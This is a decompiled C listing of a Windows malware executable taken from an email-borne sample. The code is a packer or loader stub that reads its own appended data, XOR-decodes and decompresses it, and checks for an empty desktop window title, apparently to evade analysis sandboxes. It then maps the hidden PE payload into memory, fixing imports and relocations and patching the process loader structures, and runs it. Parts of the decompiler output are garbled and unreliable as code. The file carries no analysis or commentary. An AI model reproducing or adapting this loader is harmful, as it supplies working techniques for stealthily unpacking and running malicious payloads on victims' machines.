// subject.c
// Generated on 5/4/2015 1:14:51 AM by decompiling malware_via_email/malware_0510/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(Eq_142 dwArg04, Eq_142 dwArg08, Eq_144 dwArg0C)
{
	int32 dwLoc08_15 = 0x00000000;
	while (dwLoc08_15 < dwArg0C)
	{
		dwArg04[dwLoc08_15] = dwArg08[dwLoc08_15];
		dwLoc08_15 = dwLoc08_15 + 0x00000001;
	}
	return;
}

word32 * fn00401040(word32 * ebp, word32 dwArg04, Eq_142 dwArg08, Eq_407 dwArg0C)
{
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte cl_48 = *dwArg04;
		up32 dwLoc0C_115 = 0x00000001;
		word32 dwLoc18_111 = 0x00000000;
		do
		{
			up32 ecx_66 = dwLoc0C_115 + 0x00000001;
			byte al_63 = dwArg04[dwLoc0C_115];
			dwLoc0C_115 = ecx_66;
			if ((word32) al_63 != (word32) cl_48)
			{
				dwArg08[dwLoc18_111] = al_63;
				dwLoc18_111 = dwLoc18_111 + 0x00000001;
			}
			else if ((word32) dwArg04[ecx_66] == 0x00000000)
			{
				dwArg08[dwLoc18_111] = cl_48;
				dwLoc18_111 = dwLoc18_111 + 0x00000001;
				dwLoc0C_115 = ecx_66 + 0x00000001;
			}
			else
			{
				word32 eax_126 = fn00401150(fp - 0x00000010, dwArg04 + ecx_66) + ecx_66;
				dwLoc0C_115 = fn00401150(fp - 0x00000024, dwArg04 + eax_126) + eax_126;
				up32 dwLoc1C_141 = 0x00000000;
				while (dwLoc1C_141 <u dwLoc10)
				{
					dwArg08[dwLoc18_111] = dwArg08[dwLoc18_111 - dwLoc24];
					dwLoc18_111 = dwLoc18_111 + 0x00000001;
					dwLoc1C_141 = dwLoc1C_141 + 0x00000001;
				}
			}
		} while (dwLoc0C_115 <u dwArg0C);
	}
}

word32 fn00401150(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc14_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 eax_25 = dwLoc08_12 << 0x00000007 | ecx_16 & 0x0000007F;
		word32 edx_28 = dwLoc14_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = eax_25;
		dwLoc14_13 = edx_28;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = eax_25;
	return edx_28;
}

word32 fn004011B0(word32 dwArg04)
{
	word32 eax_28;
	word32 eax_23 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_23 == 0xFFFFFFFF)
		eax_28 = 0x00000000;
	else
		eax_28 = eax_23;
	return eax_28;
}

void fn004011F0(word32 ebx, word32 ebp, word32 esi, word32 edi, selector fs, word32 dwArg04, word32 dwArg08)
{
	GetModuleHandleA(0x00000000);
	LoadIconA(GetModuleHandleA(0x00000000), 0x00403000);
	LoadCursorA(0x00000000, 0x00007F00);
	word16 ax_51 = (word16) RegisterClassA(fp - 0x00000060);
	if ((word32) ax_51 == 0x00000000)
	{
l00401642:
		return;
	}
	else
	{
		if (dwArg08 != 0x00000001)
			Mem558[0x00403068:word32] = 0x00000000;
		else
		{
			Mem559[0x00403068:word32] = 0x00000001;
			Mem561[0x00403058:word32] = dwArg04;
		}
		word32 dwLoc20_225;
		Mem195[fp - 0x00000084:word32] = 0x00000000;
		Mem199[fp - 0x00000084:word32] = GetModuleHandleA(0x00000000);
		CreateWindowExA(0x00000000, 0x0040302C, 0x00403018, 0x00000001, 0x00009942, 0x05622121, 0x00113637, 0x06724299, 0x00000000, 0x00000000, 0x00000000, 0x00000000);
		word32 dwLoc10_191 = 0x00000000 >> (byte) (dwLoc10 - 0x000208F1) << (byte) dwLoc10 >> (byte) (dwLoc10 + 0x0004B571);
		if (Mem199[0x00403068:word32] == 0x00000000)
		{
			Mem551[fp - 0x00000080:word32] = 0x00000000;
			dwLoc20_225 = GetModuleHandleA(0x00000000);
		}
		else
			dwLoc20_225 = dwArg04;
		word32 eax_230 = dwLoc20_225 + Mem199[dwLoc20_225 + 0x0000003C:word32];
		word32 eax_241 = ((word32) Mem199[eax_230 + 0x00000006:word16] - 0x00000001) *s 0x00000028 + ((eax_230 + 0x00000018) + (word32) Mem199[eax_230 + 0x00000014:word16]);
		word32 eax_247 = Mem199[eax_241 + 0x00000010:word32] - 0x00000001 + Mem199[eax_230 + 0x0000003C:word32];
		word32 eax_257 = SEQ(SEQ(0x00000000, eax_247) % Mem199[eax_230 + 0x0000003C:word32], eax_247) /u Mem199[eax_230 + 0x0000003C:word32] *s Mem199[eax_230 + 0x0000003C:word32] + Mem199[eax_241 + 0x00000014:word32];
		Mem261[fp - 0x00000080:word32] = 0x00000200;
		word32 eax_262 = fn00401DC0(0x00000000);
		if (eax_262 == 0x00000000)
			goto l00401642;
		else
		{
			Mem271[fp - 0x00000080:word32] = 0x00000200;
			Mem277[fp - 0x00000088:word32] = dwLoc20_225;
			GetModuleFileNameA(0x00000000, eax_262, 0x00000200);
			Mem282[fp - 0x00000080:word32] = eax_262;
			word32 eax_283 = fn004011B0(0x00000000);
			if (eax_283 == 0x00000000)
				goto l00401642;
			else
			{
				word32 eax_298 = GetFileSize(eax_283, 0x00000000) - eax_257;
				if (eax_298 == 0x00000000)
					goto l00401642;
				else
				{
					Mem309[fp - 0x00000080:word32] = eax_298 + 0x00000010;
					word32 eax_310 = fn00401DC0(0x00000000);
					if (eax_310 == 0x00000000)
						goto l00401642;
					else
					{
						Mem327[fp - 0x0000008C:word32] = eax_283;
						SetFilePointer(0x00000000, eax_257, 0x00000000, 0x00000000);
						Mem340[fp - 0x0000008C:word32] = eax_310;
						Mem343[fp - 0x00000090:word32] = eax_283;
						if (ReadFile(0x06724299, 0x00000000, eax_298, fp - 0x00000028, 0x00000000) == 0x00000000)
							goto l00401642;
						else
						{
							Mem354[fp - 0x00000080:word32] = eax_283;
							CloseHandle(0x00000000);
							if (dwLoc28 != eax_298)
								goto l00401642;
							else
							{
								word32 eax_364 = GetDesktopWindow();
								word32 eax_368 = fn00401DC0(0x000000C8);
								Mem372[eax_368 + 0x00000000:byte] = 0x01;
								GetWindowTextA(eax_364, eax_368, 0x000000C8);
								if ((word32) Mem372[eax_368 + 0x00000000:byte] == 0x00000000)
								{
									Mem390[fp - 0x00000080:word32] = eax_368;
									fn00401D90(0x000000C8);
									fn00401000(eax_310, eax_310 - 0x00000040 + eax_298, 0x00000040);
									word32 eax_406 = Mem390[eax_310 + 0x00000000:word32];
									word32 edx_409 = Mem390[eax_310 + 0x00000004:word32];
									word32 dwLoc0C_411 = 0x00000000;
									while (dwLoc0C_411 <u eax_406)
									{
										word32 edx_429 = dwLoc10_191 - Mem390[0x00403080:word32] << (byte) ((Mem390[0x0040306C:word32] *s Mem390[0x00403050:word32] + Mem390[0x00403080:word32]) - dwLoc10_191 *s dwLoc10_191);
										Mem438[eax_310 + dwLoc0C_411 + 0x00000008:word32] = Mem390[eax_310 + dwLoc0C_411 + 0x00000008:word32] ^ 0x0000000B;
										Mem454[0x00403070:word32] = 0x0000EB70 >> (byte) Mem438[0x0040304C:word32] << (byte) (0x000EA44C - (edx_429 << 0xFFFFFFE2)) >> (byte) (edx_429 << 0xFFFFFFE2) << (byte) Mem438[0x00403050:word32];
										dwLoc10_191 = edx_429 << 0xFFFFFFE2;
										dwLoc0C_411 = dwLoc0C_411 + 0x00000008;
									}
									Mem461[fp - 0x00000080:word32] = edx_409;
									Mem464[0x00403064:word32] = fn00401DC0(0x00000040);
									if (Mem464[0x00403064:word32] == 0x00000000)
										ExitProcess(0x07783872);
									word32 esp_498;
									word32 ebp_478 = fn00401040(fp - 0x00000004, eax_310 + 0x00000008, Mem464[0x00403064:word32], eax_406);
									Mem480[0x00403054:word32] = edi;
									Mem481[0x00403048:word32] = esi;
									Mem482[0x00403060:word32] = ebx;
									Mem483[0x0040305C:word32] = ebp_478;
									Mem486[fp - 0x00000080:word32] = 0x004015F6;
									Mem489[ebp_478 - 0x00000008:word32] = Mem486[fp - 0x00000080:word32];
									Mem492[0x00403078:word32] = Mem489[fs:0x00000018:word32];
									if (Mem492[0x00403068:word32] != 0x00000000)
									{
										Mem526[fp - 0x00000080:word32] = Mem492[ebp_478 - 0x00000008:word32] - Mem492[0x00403058:word32];
										fn00401650(dwArg00);
										esp_498 = fp - 0x0000007C;
									}
									else
									{
										Mem530[fp - 0x00000080:word32] = 0x00000000;
										Mem537[fp - 0x00000080:word32] = Mem530[ebp_478 - 0x00000008:word32] - GetModuleHandleA(Mem530[fp - 0x00000080:LPCSTR]);
										fn00401650(dwArg00);
										esp_498 = fp - 0x0000007C;
									}
									word32 esp_500 = esp_498 - 0x00000004;
									Mem501[esp_500 + 0x00000000:word32] = Mem492[0x00403064:word32];
									word32 eax_503 = fn004017C0(dwArg00);
									if (eax_503 == 0x00000000)
									{
										Mem516[esp_500 + 0x00000000:word32] = Mem501[0x00403064:word32];
										fn00401D90(dwArg00);
										Mem520[esp_500 + 0x00000000:word32] = 0x00000446;
										ExitProcess(Mem520[esp_500 + 0x00000000:UINT]);
									}
									Mem501[0x0040307C:word32]();
									return;
								}
								else
								{
									Mem545[fp - 0x00000080:word32] = eax_368;
									fn00401D90(0x000000C8);
									goto l00401642;
								}
							}
						}
					}
				}
			}
		}
	}
}

void fn00401650(word32 dwArg04)
{
fn00401650_entry:
l00401650:
	word32 dwLoc24_13
	branch Mem0[0x00403068:word32] == 0x00000000 l0040166A
l00401660:
	dwLoc24_13 = Mem0[0x00403058:word32]
	goto l00401675
l0040166A:
	dwLoc2C = 0x00000000
	dwLoc24_13 = GetModuleHandleA(0x00000000)
l00401675:
	branch dwLoc24_13 != 0x00000000 l00401682
l0040167B:
	goto l004017B0
l00401682:
	word32 edx_45 = dwLoc24_13 + Mem0[dwLoc24_13 + 0x0000003C:word32]
	Mem48[fp - 0x0000002C:word32] = 0x00000040
	Mem59[0x00403074:word32] = VirtualAlloc(0x00000000, Mem48[edx_45 + 0x00000050:word32], 0x00003000, 0x00000000)
	branch Mem59[0x00403074:word32] != 0x00000000 l004016B9
l004016B2:
	goto l004017B0
l004016B9:
	Mem68[fp - 0x0000002C:word32] = Mem59[edx_45 + 0x00000050:word32]
	Mem71[fp - 0x00000030:word32] = dwLoc24_13
	fn00401000(Mem71[0x00403074:word32], 0x00003000, dwLoc2C)
	word32 eax_77 = Mem71[0x00403074:word32] - dwLoc24_13
	branch Mem71[edx_45 + 0x000000A4:word32] == 0x00000000 l0040179E
l004016EE:
	word32 dwLoc0C_108 = dwLoc24_13 + Mem71[edx_45 + 0x000000A0:word32]
l004016FD:
	branch Mem71[dwLoc0C_108 + 0x00000004:word32] == 0x00000000 l0040179E
l0040170A:
	word32 eax_123 = Mem71[dwLoc0C_108 + 0x00000004:word32] - 0x00000008 >>u 0x00000001
	word32 ecx_126 = dwLoc0C_108 + 0x00000008
	word32 dwLoc08_129 = 0x00000000
	goto l00401733
l0040172A:
	dwLoc08_129 = dwLoc08_129 + 0x00000001
l00401733:
	branch dwLoc08_129 >=u eax_123 l0040178D
l0040173B:
	branch (word32) ecx_126[dwLoc08_129 * 0x0002] >> 0x0000000C != 0x00000003 l0040178B
l0040174D:
	Mem170[Mem71[0x00403074:word32] + Mem71[dwLoc0C_108 + 0x00000000:word32] + ((word32) ecx_126[dwLoc08_129 * 0x0002] & 0x00000FFF):word32] = Mem71[Mem71[0x00403074:word32] + Mem71[dwLoc0C_108 + 0x00000000:word32] + ((word32) ecx_126[dwLoc08_129 * 0x0002] & 0x00000FFF):word32] + eax_77
l0040178B:
	goto l0040172A
l0040178D:
	dwLoc0C_108 = dwLoc0C_108 + Mem71[dwLoc0C_108 + 0x00000004:word32]
	goto l004016FD
l0040179E:
l004017B0:
	return
fn00401650_exit:
}

word32 fn004017C0(word32 dwArg04)
{
	word32 eax_249;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	word32 dwLoc24_109 = edx_16 + 0x00000018 + (word32) Mem0[edx_16 + 0x00000014:word16];
	word32 eax_33 = VirtualAlloc(0x00000000, Mem0[edx_16 + 0x00000050:word32], 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		eax_249 = 0x00000000;
	else
	{
		Mem94[fp - 0x0000004C:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem97[fp - 0x00000050:word32] = dwArg04;
		fn00401000(eax_33, 0x00003000, 0x00000040);
		word32 dwLoc0C_103 = 0x00000000;
		while (dwLoc0C_103 <u (word32) Mem97[edx_16 + 0x00000006:word16])
		{
			if (Mem97[dwLoc24_109 + 0x00000014:word32] != 0x00000000 && Mem97[dwLoc24_109 + 0x00000010:word32] != 0x00000000)
			{
				word32 eax_144 = Mem97[dwLoc24_109 + 0x00000010:word32] - 0x00000001 + Mem97[edx_16 + 0x0000003C:word32];
				fn00401000(eax_33 + Mem97[dwLoc24_109 + 0x0000000C:word32], dwArg04 + Mem97[dwLoc24_109 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_144) % Mem97[edx_16 + 0x0000003C:word32], eax_144) /u Mem97[edx_16 + 0x0000003C:word32] *s Mem97[edx_16 + 0x0000003C:word32]);
			}
			dwLoc24_109 = dwLoc24_109 + 0x00000028;
			dwLoc0C_103 = dwLoc0C_103 + 0x00000001;
		}
		word32 ecx_172 = eax_33 + Mem97[eax_33 + 0x0000003C:word32];
		word32 dwLoc44_178 = eax_33 + Mem97[ecx_172 + 0x00000080:word32];
		while (Mem97[dwLoc44_178 + 0x00000010:word32] != 0x00000000)
		{
			word32 eax_200 = GetModuleHandleA(eax_33 + Mem97[dwLoc44_178 + 0x0000000C:word32]);
			word32 dwLoc14_202 = eax_200;
			if (eax_200 == 0x00000000)
			{
				if (Mem97[0x00403068:word32] != 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401CDF;
				}
				word32 eax_327 = LoadLibraryA(eax_33 + Mem97[dwLoc44_178 + 0x0000000C:word32]);
				dwLoc14_202 = eax_327;
				if (eax_327 == 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401CDF;
				}
				goto l00401928;
			}
l00401928:
			word32 dwLoc30_214;
			word32 dwLoc20_213;
			if (Mem97[dwLoc44_178 + 0x00000000:word32] != 0x00000000)
			{
				dwLoc20_213 = eax_33 + Mem97[dwLoc44_178 + 0x00000000:word32];
				dwLoc30_214 = eax_33 + Mem97[dwLoc44_178 + 0x00000010:word32];
			}
			else
			{
				dwLoc20_213 = eax_33 + Mem97[dwLoc44_178 + 0x00000010:word32];
				dwLoc30_214 = eax_33 + Mem97[dwLoc44_178 + 0x00000000:word32];
			}
			if (Mem97[dwLoc44_178 + 0x00000010:word32] != 0x00000000 && Mem97[dwLoc44_178 + 0x00000000:word32] != 0x00000000)
			{
				Mem301[fp - 0x00000010:word32] = 0x00000001;
				goto l0040197F;
			}
l0040197F:
			while (Mem97[dwLoc20_213 + 0x00000000:word32] != 0x00000000)
			{
				if ((Mem97[dwLoc20_213 + 0x00000000:word32] & 0x80000000) != 0x00000000)
					Mem280[dwLoc20_213 + 0x00000000:word32] = GetProcAddress(dwLoc14_202, Mem97[dwLoc20_213 + 0x00000000:word32] & 0x7FFFFFFF);
				else
					Mem293[dwLoc20_213 + 0x00000000:word32] = GetProcAddress(dwLoc14_202, Mem97[dwLoc20_213 + 0x00000000:word32] + 0x00000002 + eax_33);
				if (Mem97[dwLoc20_213 + 0x00000000:word32] == 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401CDF;
				}
				if (0x00000000 != 0x00000000)
					Mem266[dwLoc30_214 + 0x00000000:word32] = Mem97[dwLoc20_213 + 0x00000000:word32];
				dwLoc20_213 = dwLoc20_213 + 0x00000004;
				dwLoc30_214 = dwLoc30_214 + 0x00000004;
			}
			dwLoc44_178 = dwLoc44_178 + 0x00000014;
		}
		if (Mem97[0x00403068:word32] != 0x00000000)
		{
			word32 edx_618 = Mem97[0x00403058:word32] - Mem97[ecx_172 + 0x00000034:word32];
			if (Mem97[ecx_172 + 0x000000A4:word32] != 0x00000000)
			{
				word32 dwLoc18_627 = eax_33 + Mem97[ecx_172 + 0x000000A0:word32];
				while (Mem97[dwLoc18_627 + 0x00000004:word32] != 0x00000000)
				{
					word32 edx_642 = Mem97[dwLoc18_627 + 0x00000004:word32] - 0x00000008 >>u 0x00000001;
					word32 eax_645 = dwLoc18_627 + 0x00000008;
					word32 dwLoc0C_648 = 0x00000000;
					while (dwLoc0C_648 <u edx_642)
					{
						if ((word32) eax_645[dwLoc0C_648 * 0x0002] >> 0x0000000C == 0x00000003)
							Mem689[eax_33 + Mem97[dwLoc18_627 + 0x00000000:word32] + ((word32) eax_645[dwLoc0C_648 * 0x0002] & 0x00000FFF):word32] = Mem97[eax_33 + Mem97[dwLoc18_627 + 0x00000000:word32] + ((word32) eax_645[dwLoc0C_648 * 0x0002] & 0x00000FFF):word32] + edx_618;
						dwLoc0C_648 = dwLoc0C_648 + 0x00000001;
					}
					dwLoc18_627 = dwLoc18_627 + Mem97[dwLoc18_627 + 0x00000004:word32];
				}
			}
		}
		word32 eax_353 = Mem97[ecx_172 + 0x00000050:word32];
		Mem359[fp - 0x00000058:word32] = 0x00000004;
		word32 eax_364 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_353, 0x00000000);
		if (eax_364 == 0x00000000)
			eax_249 = 0x00000000;
		else
		{
			if (Mem359[0x00403068:word32] != 0x00000000)
			{
				Mem583[fp - 0x0000004C:word32] = Mem359[0x00403058:word32];
				Mem587[fp - 0x00000054:word32] = 0x00000000;
				Mem589[fp - 0x00000058:word32] = 0x00000000;
				Mem591[fp - 0x0000005C:word32] = 0x00000022;
				Mem594[fp - 0x00000060:word32] = eax_364;
				Mem597[0x00403074:word32] = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			else
			{
				Mem601[fp - 0x0000004C:word32] = Mem359[ecx_172 + 0x00000034:word32];
				Mem605[fp - 0x00000054:word32] = 0x00000000;
				Mem607[fp - 0x00000058:word32] = 0x00000000;
				Mem609[fp - 0x0000005C:word32] = 0x00000022;
				Mem612[fp - 0x00000060:word32] = eax_364;
				Mem615[0x00403074:word32] = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (Mem359[0x00403074:word32] != 0x00000000)
				goto l00401C70;
			else if (Mem359[0x00403068:word32] == 0x00000000)
				if (UnmapViewOfFile(Mem359[ecx_172 + 0x00000034:word32]) == 0x00000000)
				{
					Mem567[fp - 0x00000050:word32] = 0x00000000;
					Mem571[fp - 0x00000054:word32] = Mem567[ecx_172 + 0x00000034:word32];
					if (VirtualFree(0x00000000, 0x00000000, 0x00008000) == 0x00000000)
						eax_249 = 0x00000000;
					else
						goto l00401BC9;
				}
				else
					goto l00401BC9;
			else if (UnmapViewOfFile(Mem359[0x00403058:word32]) == 0x00000000)
			{
				Mem542[fp - 0x00000050:word32] = 0x00000000;
				Mem545[fp - 0x00000054:word32] = Mem542[0x00403058:word32];
				if (VirtualFree(0x00000000, 0x00000000, 0x00008000) == 0x00000000)
					eax_249 = 0x00000000;
				else
				{
l00401B97:
l00401BC9:
					if (Mem359[0x00403068:word32] != 0x00000000)
					{
						word32 eax_489 = Mem359[0x00403058:word32];
						Mem493[fp - 0x00000050:word32] = 0x00000000;
						Mem497[fp - 0x00000058:word32] = 0x00000000;
						Mem499[fp - 0x0000005C:word32] = 0x00000022;
						Mem505[0x00403074:word32] = MapViewOfFileEx(eax_364, 0x00000022, 0x00000000, 0x00000000, 0x00000000, eax_489);
					}
					else
					{
						word32 eax_507 = Mem359[ecx_172 + 0x00000034:word32];
						Mem511[fp - 0x00000050:word32] = 0x00000000;
						Mem515[fp - 0x00000058:word32] = 0x00000000;
						Mem517[fp - 0x0000005C:word32] = 0x00000022;
						Mem523[0x00403074:word32] = MapViewOfFileEx(eax_364, 0x00000022, 0x00000000, 0x00000000, 0x00000000, eax_507);
					}
					if (Mem359[0x00403074:word32] != 0x00000000)
						goto l00401C70;
					else
					{
						if (Mem359[0x00403068:word32] != 0x00000000)
						{
							Mem463[fp - 0x00000050:word32] = 0x00003000;
							Mem467[fp - 0x00000054:word32] = Mem463[ecx_172 + 0x00000050:word32];
							Mem470[fp - 0x00000058:word32] = Mem467[0x00403058:word32];
							Mem473[0x00403074:word32] = VirtualAlloc(0x00000000, 0x00000000, 0x00000000, 0x00000040);
						}
						else
						{
							Mem477[fp - 0x00000050:word32] = 0x00003000;
							Mem481[fp - 0x00000054:word32] = Mem477[ecx_172 + 0x00000050:word32];
							Mem485[fp - 0x00000058:word32] = Mem481[ecx_172 + 0x00000034:word32];
							Mem488[0x00403074:word32] = VirtualAlloc(0x00000000, 0x00000000, 0x00000000, 0x00000040);
						}
						if (Mem359[0x00403074:word32] == 0x00000000)
							eax_249 = 0x00000000;
						else
						{
l00401C70:
							fn00401000(Mem359[0x00403074:word32], eax_33, Mem359[ecx_172 + 0x00000050:word32]);
							if (Mem359[0x00403068:word32] != 0x00000000)
								fn00401CF0(Mem359[0x00403058:word32], Mem359[0x00403074:word32] + Mem359[ecx_172 + 0x00000028:word32]);
							else
								fn00401D60(Mem359[0x00403074:word32]);
							Mem405[0x0040307C:word32] = Mem359[0x00403074:word32] + Mem359[ecx_172 + 0x00000028:word32];
							Mem408[ecx_172 + 0x00000028:word32] = Mem405[0x0040307C:word32];
							eax_249 = 0x00000001;
						}
					}
				}
			}
			else
				goto l00401B97;
		}
	}
l00401CDF:
	return eax_249;
}

void fn00401CF0(word32 dwArg04, word32 dwArg08)
{
	word32 ecx_14 = Mem0[Mem0[Mem0[Mem0[0x00403078:word32] + 0x00000030:word32] + 0x0000000C:word32] + 0x0000000C:word32];
	word32 dwLoc10_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc10_15 == 0x00000000)
			goto l00401D5C;
		if (Mem0[dwLoc10_15 + 0x00000018:word32] == dwArg04)
		{
			Mem50[dwLoc10_15 + 0x0000001C:word32] = dwArg08;
			goto l00401D5C;
		}
		word32 eax_53 = Mem0[dwLoc10_15 + 0x00000000:word32];
		dwLoc10_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l00401D5C;
	}
l00401D5C:
	return;
}

void fn00401D60(word32 dwArg04)
{
	word32 ecx_10 = Mem0[0x00403078:word32];
	Mem22[Mem0[ecx_10 + 0x00000030:word32] + 0x00000008:word32] = dwArg04;
	return;
}

void fn00401D90(word32 dwArg04)
{
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn00401DC0(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

